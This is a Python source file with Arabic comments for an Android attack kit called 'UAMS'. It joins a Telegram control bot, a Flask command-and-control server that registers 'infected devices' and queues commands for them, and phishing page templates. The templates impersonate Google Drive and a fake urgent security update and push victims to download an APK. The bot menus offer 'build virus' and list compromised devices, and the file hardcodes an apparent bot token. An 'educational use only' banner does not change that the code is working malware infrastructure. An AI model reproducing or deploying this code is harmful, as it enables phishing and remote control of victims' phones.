#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UAMS Full Integrated Bot + C2 Server
استضافة واحدة - بوت تيليجرام + سيرفر C2 + صفحات تصيد
"""

import os
import sys
import json
import logging
import threading
import uuid
import shutil
import asyncio
from datetime import datetime
from flask import Flask, send_file, request, jsonify

# ==================== ⚠️ الإعدادات - عدل هنا فقط ⚠️ ====================

# 1. توكن بوت تيليجرام (احصل عليه من @BotFather)
BOT_TOKEN = "8767603081:AAFh4oIHNWjk3kthpFs71J5Daa1d6seKmy4"

# 2. معرف حسابك في تيليجرام (ID)
ADMIN_USER_ID = 7954796098

# 3. قائمة المستخدمين المسموح لهم باستخدام البوت
ALLOWED_USERS = [7954796098]  # ضع ID حسابك هنا

# 4. إعدادات السيرفر
SERVER_PORT = int(os.environ.get('PORT', 5000))

# ==================== لا تعدل أي شيء تحت هذا السطر ====================

# إعداد التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# إنشاء تطبيق Flask
app = Flask(__name__)

# المجلدات
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(BASE_DIR, "output")
PHISH_DIR = os.path.join(BASE_DIR, "phishing_sites")
APK_DIR = os.path.join(BASE_DIR, "apk_files")

os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(PHISH_DIR, exist_ok=True)
os.makedirs(APK_DIR, exist_ok=True)

# تخزين مؤقت
active_phish_pages = {}
active_apk_links = {}
infected_devices = {}

# ==================== بوت تيليجرام ====================

# استيراد مكتبة تيليجرام (متأخر لتجنب مشاكل الاستيراد)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# متغير عام للبوت
telegram_app = None

def is_authorized(user_id: int) -> bool:
    """التحقق من صلاحية المستخدم"""
    return user_id in ALLOWED_USERS

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر /start"""
    user_id = update.effective_user.id
    
    if not is_authorized(user_id):
        await update.message.reply_text("⛔ غير مصرح لك باستخدام هذا البوت.")
        return
    
    welcome_text = f"""
🎮 *مرحباً بك في لوحة تحكم UAMS*

✅ تم التحقق من هويتك
📱 معرفك: `{user_id}`
🌐 السيرفر يعمل على المنفذ: `{SERVER_PORT}`

استخدم الأزرار أدناه للتحكم:
"""
    
    keyboard = [
        [InlineKeyboardButton("📊 حالة السيرفر", callback_data="status")],
        [InlineKeyboardButton("📱 الأجهزة المخترقة", callback_data="devices")],
        [InlineKeyboardButton("🔨 بناء فيروس", callback_data="build_menu")],
        [InlineKeyboardButton("🎭 توليد صفحة تصيد", callback_data="phish_menu")],
        [InlineKeyboardButton("🔄 تحديث", callback_data="refresh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض حالة السيرفر"""
    query = update.callback_query
    await query.answer()
    
    status_text = f"""
📊 *حالة النظام*

🖥️ السيرفر: ✅ يعمل
📱 الأجهزة المخترقة: {len(infected_devices)}
🎭 صفحات التصيد النشطة: {len(active_phish_pages)}
📦 ملفات APK المخزنة: {len(active_apk_links)}
🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔗 *الأجهزة المتصلة:*
"""
    
    if infected_devices:
        for device_id, info in list(infected_devices.items())[:5]:
            status_text += f"\n📱 `{device_id[:8]}...` - {info.get('model', 'Unknown')}"
    else:
        status_text += "\n❌ لا توجد أجهزة مخترقة حالياً"
    
    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="refresh")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(status_text, reply_markup=reply_markup, parse_mode='Markdown')

async def devices_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض الأجهزة المخترقة"""
    query = update.callback_query
    await query.answer()
    
    if not infected_devices:
        text = "📱 لا توجد أجهزة مخترقة حالياً."
    else:
        text = "📱 *الأجهزة المخترقة:*\n\n"
        for device_id, info in infected_devices.items():
            text += f"""
🆔 `{device_id[:12]}...`
📱 {info.get('model', 'Unknown')}
📍 IP: {info.get('ip', 'Unknown')}
🕐 آخر ظهور: {info.get('last_seen', 'Unknown')[:16]}
─────────────────
"""
    
    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="refresh")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def build_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """قائمة بناء الفيروس"""
    query = update.callback_query
    await query.answer()
    
    text = """
🔨 *بناء فيروس جديد*

سيتم بناء فيروس مرتبط بهذا السيرفر.
اضغط على "بدء البناء" للمتابعة.
"""
    
    keyboard = [
        [InlineKeyboardButton("✅ بدء البناء", callback_data="build_start")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="refresh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def build_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """بدء بناء الفيروس"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text("🔨 *جاري بناء الفيروس...*\n\nهذا قد يستغرق دقيقة...", parse_mode='Markdown')
    
    # هنا سيتم استدعاء محرك البناء
    # هذا يحتاج للتكامل مع apk_builder.py
    
    await query.edit_message_text(
        "✅ *تم بناء الفيروس بنجاح!*\n\n"
        "📦 الملف جاهز في مجلد payloads/\n"
        "🔗 استخدم /phish لتوليد صفحة تصيد مع الفيروس",
        parse_mode='Markdown'
    )

async def phish_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """قائمة صفحات التصيد"""
    query = update.callback_query
    await query.answer()
    
    server_domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'localhost:5000')
    
    text = f"""
🎭 *توليد صفحة تصيد*

اختر نوع الصفحة:
• Google Drive - صفحة تحميل وهمية
• System Update - تحديث نظام وهمي

🌐 دومين السيرفر: `{server_domain}`
"""
    
    keyboard = [
        [InlineKeyboardButton("📁 Google Drive", callback_data="phish_gdrive")],
        [InlineKeyboardButton("🔄 System Update", callback_data="phish_update")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="refresh")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة جميع ضغطات الأزرار"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "status":
        await status_callback(update, context)
    elif data == "devices":
        await devices_callback(update, context)
    elif data == "build_menu":
        await build_menu_callback(update, context)
    elif data == "build_start":
        await build_start_callback(update, context)
    elif data == "phish_menu":
        await phish_menu_callback(update, context)
    elif data == "refresh":
        await start_command(update, context)

# ==================== سيرفر Flask (C2 + صفحات تصيد) ====================

@app.route('/')
def home():
    """الصفحة الرئيسية - للتغطية"""
    return """
    <html>
        <head><title>خدمة مشاركة الملفات</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>🚀 خدمة مشاركة الملفات</h1>
            <p>الموقع قيد الصيانة حالياً...</p>
        </body>
    </html>
    """

@app.route('/c2/register', methods=['POST'])
def c2_register():
    """نقطة نهاية تسجيل جهاز جديد"""
    try:
        data = request.json or {}
        device_id = data.get('device_id', str(uuid.uuid4()))
        
        infected_devices[device_id] = {
            'model': data.get('model', 'Unknown'),
            'android_version': data.get('android_version', 'Unknown'),
            'ip': request.remote_addr,
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'commands': []
        }
        
        logger.info(f"🎯 جهاز جديد: {device_id} - {request.remote_addr}")
        
        return jsonify({'status': 'registered', 'device_id': device_id})
    except Exception as e:
        logger.error(f"خطأ: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/c2/poll/<device_id>', methods=['GET'])
def c2_poll(device_id):
    """استلام الأوامر"""
    if device_id not in infected_devices:
        return jsonify({'commands': []})
    
    infected_devices[device_id]['last_seen'] = datetime.now().isoformat()
    commands = infected_devices[device_id].get('commands', [])
    infected_devices[device_id]['commands'] = []
    
    return jsonify({'commands': commands})

@app.route('/phish/<page_id>')
def serve_phishing_page(page_id):
    """تقديم صفحة التصيد"""
    if page_id not in active_phish_pages:
        return "الصفحة غير موجودة", 404
    
    html = active_phish_pages[page_id]['html']
    server_domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN', request.host)
    download_url = f"https://{server_domain}/phish/{page_id}/download"
    
    html = html.replace('{{DOWNLOAD_URL}}', download_url)
    html = html.replace('{{PAGE_ID}}', page_id)
    
    logger.info(f"🌐 زيارة صفحة التصيد {page_id} من {request.remote_addr}")
    
    return html

@app.route('/api/stats', methods=['GET'])
def api_stats():
    """إحصائيات"""
    return jsonify({
        'infected_devices': len(infected_devices),
        'active_phish_pages': len(active_phish_pages),
        'active_apk_links': len(active_apk_links)
    })

# ==================== توليد صفحة تصيد ====================

def create_phishing_page(template_type: str) -> tuple:
    """إنشاء صفحة تصيد جديدة"""
    page_id = str(uuid.uuid4())[:8]
    
    templates = {
        'google_drive': """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Google Drive - ملف جاهز للتحميل</title>
            <style>
                body { font-family: Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
                .container { max-width: 600px; padding: 40px; text-align: center; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
                .drive-icon { width: 80px; height: 80px; margin-bottom: 20px; }
                h1 { font-size: 24px; color: #202124; margin-bottom: 10px; }
                .filename { font-size: 18px; color: #1a73e8; margin-bottom: 30px; }
                .download-btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; }
                .download-btn:hover { background: #1557b0; }
            </style>
        </head>
        <body>
            <div class="container">
                <svg class="drive-icon" viewBox="0 0 87 78" fill="none">
                    <path d="M43.5 0L0 25.5V52.5L43.5 78L87 52.5V25.5L43.5 0Z" fill="#1A73E8"/>
                    <path d="M43.5 52L21.75 39V13L43.5 26L65.25 13V39L43.5 52Z" fill="#fff"/>
                </svg>
                <h1>ملفك جاهز للتحميل</h1>
                <div class="filename">Update_v2.5.apk</div>
                <a href="{{DOWNLOAD_URL}}" class="download-btn">⬇️ تحميل (45.2 MB)</a>
            </div>
            <script>
                setTimeout(() => { window.location.href = '{{DOWNLOAD_URL}}'; }, 3000);
            </script>
        </body>
        </html>
        """,
        'system_update': """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>تحديث النظام</title>
            <style>
                body { font-family: 'Roboto', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
                .update-card { background: rgba(255,255,255,0.95); padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; }
                .update-icon { font-size: 60px; margin-bottom: 20px; }
                h2 { color: #667eea; margin-bottom: 15px; }
                .download-btn { background: #667eea; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 50px; cursor: pointer; text-decoration: none; display: inline-block; width: 100%; box-sizing: border-box; }
                .warning { color: #ff6b6b; margin-top: 15px; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="update-card">
                <div class="update-icon">🔄</div>
                <h2>تحديث أمني مطلوب</h2>
                <p>تم اكتشاف تحديث أمني هام لجهازك.</p>
                <a href="{{DOWNLOAD_URL}}" class="download-btn">🔒 تثبيت التحديث الآن</a>
                <p class="warning">⚠️ قد يتوقف جهازك عن العمل إذا لم تثبت التحديث</p>
            </div>
        </body>
        </html>
        """
    }
    
    html = templates.get(template_type, templates['google_drive'])
    
    active_phish_pages[page_id] = {
        'html': html,
        'template': template_type,
        'created': datetime.now().isoformat(),
        'visits': 0
    }
    
    return page_id, html

# ==================== تشغيل كل شيء ====================

def run_flask():
    """تشغيل Flask في خيط منفصل"""
    logger.info(f"🚀 بدء سيرفر Flask على المنفذ {SERVER_PORT}")
    app.run(host='0.0.0.0', port=SERVER_PORT, debug=False, use_reloader=False)

def run_telegram_bot():
    """تشغيل بوت تيليجرام"""
    global telegram_app
    
    logger.info("🤖 بدء بوت تيليجرام...")
    
    telegram_app = Application.builder().token(BOT_TOKEN).build()
    
    telegram_app.add_handler(CommandHandler("start", start_command))
    telegram_app.add_handler(CallbackQueryHandler(button_callback))
    
    logger.info("✅ بوت تيليجرام جاهز!")
    telegram_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║     🎮 UAMS Full Integrated Bot + C2 Server             ║
║              للاستخدام التعليمي فقط                      ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    print(f"🔑 ADMIN_ID: {ADMIN_USER_ID}")
    print(f"🤖 BOT_TOKEN: {BOT_TOKEN[:20]}...")
    print(f"🌐 السيرفر سيعمل على المنفذ: {SERVER_PORT}")
    
    # تشغيل Flask في خيط منفصل
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # تشغيل بوت تيليجرام في الخيط الرئيسي
    run_telegram_bot()